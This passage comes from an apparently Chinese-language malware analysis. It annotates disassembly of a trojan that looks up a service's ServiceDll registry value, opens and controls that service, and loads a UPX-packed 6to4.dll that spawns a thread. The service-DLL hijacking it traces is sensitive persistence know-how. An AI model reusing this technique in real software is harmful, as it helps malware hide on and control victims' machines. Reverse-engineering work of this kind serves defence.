
```
00401B6B    FF15 E0204000   call    dword ptr [4020E0]            ; USER32.wsprintfA

00401B71    83C4 0C         add     esp, 0C                       ; 平衡堆栈

00401B74    8D85 ECFBFFFF   lea     eax, dword ptr [ebp-414]      ; 取得s\_2（ebp-414）的地址

00401B7A    50              push    eax                           ; 返回的句柄s\_2handle = 0012EE08

00401B7B    6A 01           push    1                             ; Access = KEY\_QUERY\_VALUE

00401B7D    6A 00           push    0                             ; reserved=0

00401B7F    8D85 F0FBFFFF   lea     eax, dword ptr [ebp-410]      ; 取得s\_sprintf（ebp-410）的地址

00401B85    50              push    eax                           ; Subkey = "SYSTEM\CurrentControlSet\Services\6to4\Parameters"

00401B86    68 02000080     push    80000002                      ; hKey = HKEY\_LOCAL\_MACHINE

00401B8B    FF15 1C204000   call    dword ptr [40201C]            ; ADVAPI32.RegOpenKeyExA

00401B91    85C0            test    eax, eax                      ; 打开支持服务的dll注册选项

00401B93    0F85 EF000000   jnz     00401C88                      ; 不等于零，则打开错误跳转

00401B99    68 00040000     push    400

00401B9E    6A 00           push    0

00401BA0    8D85 F0FBFFFF   lea     eax, dword ptr [ebp-410]      ; 清空s——sprintf

00401BA6    50              push    eax

00401BA7    E8 E8000000     call    00401C94                      ; jmp 到 MSVCRT.memset

00401BAC    83C4 0C         add     esp, 0C

00401BAF    C745 F8 0004000>mov     dword ptr [ebp-8], 400        ; s\_size（ebp-8）赋值400

00401BB6    8D45 F8         lea     eax, dword ptr [ebp-8]

00401BB9    50              push    eax

00401BBA    8D85 F0FBFFFF   lea     eax, dword ptr [ebp-410]      ; sprintf接受值当前的服务链接库

00401BC0    50              push    eax

00401BC1    8D45 F0         lea     eax, dword ptr [ebp-10]       ; s\_5valuetype(ebp-10)

00401BC4    50              push    eax                           ; pValueType = 0012F20C

00401BC5    6A 00           push    0                             ; Reserved = NULL

00401BC7    68 38224000     push    00402238                      ; ValueName = "ServiceDll"

00401BCC    FFB5 ECFBFFFF   push    dword ptr [ebp-414]           ; s\_2handle句柄，搜索服务当前的支持动态链接库

00401BD2    FF15 08204000   call    dword ptr [402008]            ; ADVAPI32.RegQueryValueExA

00401BD8    FF75 0C         push    dword ptr [ebp+C]             ; 第二参数psubspace进栈

00401BDB    8D85 F0FBFFFF   lea     eax, dword ptr [ebp-410]

00401BE1    50              push    eax                           ; sprintf接受值

00401BE2    FF15 64204000   call    dword ptr [402064]            ; kernel32.lstrcmpiA

00401BE8    85C0            test    eax, eax

00401BEA    0F85 8C000000   jnz     00401C7C                      ; 如果psubspace和sprintf不一样跳转

00401BF0    FF75 FC         push    dword ptr [ebp-4]             ; 如果一样，把这个服务名

00401BF3    FF75 10         push    dword ptr [ebp+10]            ; 把服务值赋给pz地址处

00401BF6    FF15 94204000   call    dword ptr [402094]            ; kernel32.lstrcpyA

00401BFC    68 3F000F00     push    0F003F

00401C01    6A 00           push    0

00401C03    6A 00           push    0                             ; 打开数据库连接

00401C05    FF15 24204000   call    dword ptr [402024]            ; ADVAPI32.OpenSCManagerA

00401C0B    8985 E8FBFFFF   mov     dword ptr [ebp-418], eax

00401C11    6A 20           push    20

00401C13    FF75 FC         push    dword ptr [ebp-4]

00401C16    FFB5 E8FBFFFF   push    dword ptr [ebp-418]           ; 打开服务这个服务

00401C1C    FF15 14204000   call    dword ptr [402014]            ; ADVAPI32.OpenServiceA

00401C22    8985 E4FBFFFF   mov     dword ptr [ebp-41C], eax      ; hservice（ebp-41c）

00401C28    6A 1C           push    1C

00401C2A    6A 00           push    0

00401C2C    8D85 C8FBFFFF   lea     eax, dword ptr [ebp-438]

00401C32    50              push    eax

00401C33    E8 5C000000     call    00401C94                      ; jmp 到 MSVCRT.memset

00401C38    83C4 0C         add     esp, 0C

00401C3B    8D85 C8FBFFFF   lea     eax, dword ptr [ebp-438]

00401C41    50              push    eax

00401C42    6A 01           push    1

00401C44    FFB5 E4FBFFFF   push    dword ptr [ebp-41C]

00401C4A    FF15 28204000   call    dword ptr [402028]            ; ADVAPI32.ControlService

00401C50    8945 F4         mov     dword ptr [ebp-C], eax

00401C53    FFB5 E4FBFFFF   push    dword ptr [ebp-41C]

00401C59    FF15 30204000   call    dword ptr [402030]            ; ADVAPI32.CloseServiceHandle

00401C5F    FFB5 E8FBFFFF   push    dword ptr [ebp-418]

00401C65    FF15 30204000   call    dword ptr [402030]            ; ADVAPI32.CloseServiceHandle

00401C6B    FFB5 ECFBFFFF   push    dword ptr [ebp-414]

00401C71    FF15 10204000   call    dword ptr [402010]            ; ADVAPI32.RegCloseKey

00401C77    8B45 F4         mov     eax, dword ptr [ebp-C]

00401C7A    EB 14           jmp     short 00401C90

00401C7C    FFB5 ECFBFFFF   push    dword ptr [ebp-414]           ; 关闭打开的注册表

00401C82    FF15 10204000   call    dword ptr [402010]            ; ADVAPI32.RegCloseKey

00401C88  ^ E9 91FEFFFF     jmp     00401B1E                      ; 循环查找下一项注册表

00401C8D    8B45 F4         mov     eax, dword ptr [ebp-C]

00401C90    C9              leave

00401C91    C2 0C00         retn    0C
```

`create(文件名)`函数，创建文件，

`createdos`函数，创建一个批处理文件，并执行，成功返回`true`。

## `6to4.dll`文件：

`6to4.dll`文件也是upx加壳的，它的主程序入口是：`10005D51`

`6to4.dll`主程序，主要是在`100032FD`处`f(x, y, z)`函数中创建了线程线程，线程的过程函数在`332a`地址。

## 主程序的分析：

```
10005D51    55              push    ebp                        ; 主程序入口

10005D52    8BEC            mov     ebp, esp

10005D54    53              push    ebx                        ; 模块入口点

10005D55    8B5D 08         mov     ebx, dword ptr [ebp+8]     ; 参数x，6to4.10000000

10005D58    56              push    esi

10005D59    8B75 0C         mov     esi, dword ptr [ebp+C]     ; 参数y，输入参数个数

10005D5C    57              push    edi

10005D5D    8B7D 10         mov     edi, dword ptr [ebp+10]    ; 参数z

10005D60    85F6            test    esi, esi

10005D62    75 09           jnz     short 10005D6D             ; y！=0，跳转

10005D64    833D 10900010 0>cmp     dword ptr [10009010], 0    ; 如果y==0，再比较【10009010】==0

10005D6B    EB 26           jmp     short 10005D93

10005D6D    83FE 01         cmp     esi, 1                     ; 如果y==1跳转

10005D70    74 05           je      short 10005D77

10005D72    83FE 02         cmp     esi, 2

10005D75    75 22           jnz     short 10005D99

10005D77    A1 9C940010     mov     eax, dword ptr [1000949C]  ; y==1跳转到这里，判断【1000949c】是否为零

10005D7C    85C0            test    eax, eax

10005D7E    74 09           je      short 10005D89

10005D80    57              push    edi

10005D81    56              push    esi

10005D82    53              push    ebx

10005D83    FFD0            call    eax

10005D85    85C0            test    eax, eax

10005D87    74 0C           je      short 10005D95             ; 为零就跳转

10005D89    57              push    edi                        ; y==1，【1000949c】==零就跳到这里

10005D8A    56              push    esi

10005D8B    53              push    ebx

10005D8C    E8 15FFFFFF     call    10005CA6                   ; 调用函数f1【4910】0（x，y，z），分配80的空间指针在9498处返回true

10005D91    85C0            test    eax, eax

10005D93    75 04           jnz     short 10005D99             ; 函数f1【4910】0（x，y，z）结果返回不是零跳转

10005D95    33C0            xor     eax, eax

10005D97    EB 4E           jmp     short 10005DE7

10005D99    57              push    edi

10005D9A    56              push    esi

10005D9B    53              push    ebx

10005D9C    E8 5CD5FFFF     call    100032FD                   ; 调用f（x，y，z）创建线程线程过程函数332a

10005DA1    83FE 01         cmp     esi, 1

10005DA4    8945 0C         mov     dword ptr [ebp+C], eax     ; 返回bool型变量，函数的第二个参数给为是否调用创建线程

10005DA7    75 0C           jnz     short 10005DB5

10005DA9    85C0            test    eax, eax

10005DAB    75 37           jnz     short 10005DE4             ; 返回f返回值不是零就跳转结束
```
